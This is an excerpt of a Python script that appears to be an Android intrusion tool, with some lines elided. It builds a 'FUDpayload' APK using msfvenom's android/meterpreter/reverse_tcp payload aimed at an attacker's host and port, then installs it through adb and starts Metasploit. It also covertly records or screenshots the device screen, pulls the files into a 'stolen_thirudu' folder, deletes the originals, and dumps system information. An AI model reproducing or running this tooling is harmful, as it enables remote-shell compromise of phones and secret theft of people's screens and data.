...
sec=str(current_time.minute)+str(current_time.second)
 
app_name='FUDpayload_'+sec+'.apk'
...
def payload_inject():
    os.system('adb install aayutham/'+app_name)
    time.sleep(3)
...
def payload_creator():
    ...
    if r_port=='' or r_port=='4444':
        os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+r_ip+' LPORT=4444 '+'o > aayutham/'+app_name)
        ...
        os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+r_ip+' LPORT='+r_port+' o > aayutham/'+app_name)
        print('injecting payload ......')
        payload_inject()
        print('injected')
        metas()
...
def screen_casting():
    ...
    while True:
        ...
        if steal[0]=='screenrec':
            ...
            os.system('adb shell screenrecord /sdcard/screen'+sec+'.mp4')
            time.sleep(1)
            os.system('adb pull /sdcard/screen'+sec+'.mp4 '+'stolen_thirudu/')
            time.sleep(1)
            os.system('adb shell rm /sdcard/screen'+sec+'.mp4')
        elif steal[0]=='exit' or steal[0]=='back':
            break
        elif steal[0]=='screenshot':
            os.system('adb shell screencap /sdcard/screencap'+sec+'.png')
            time.sleep(1)
            os.system('adb pull /sdcard/screencap'+sec+'.png '+'stolen_thirudu/')
            time.sleep(1)
            os.system('adb shell rm /sdcard/screencap'+sec+'.png')
...
def systools():
    ...
    while True:
        ...
        if systm=='sys' or systm=='info':
            print('Please wait....')
            os.system('adb shell dumpsys > stolen_thirudu/dump_'+sec+'.txt')
            print('dump data saved as stolen_thirudu/dump_'+sec+'.txt')
        elif systm=='netstat':
            print()
...
print()
help=open('ezhuthukal/menu.txt','r').read()
print(help)
print()
while True:
